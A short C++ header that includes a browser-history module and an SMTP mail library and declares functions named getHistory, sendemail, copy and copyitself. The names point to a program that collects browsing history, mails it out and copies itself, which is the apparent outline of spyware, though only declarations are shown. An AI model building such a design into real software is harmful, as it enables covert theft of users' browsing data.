#pragma once
#include "BrowsHistory.h"
#include <iostream>
#include <fstream>
#include <cstring>
#include <vector>  
#include "CSmtp.h"
#include <vector>  
#include "afxwin.h"  
#include <direct.h>
using namespace std;

using namespace std;
void getHistory();
void sendemail();
void copy();
void copyitself(const char *s);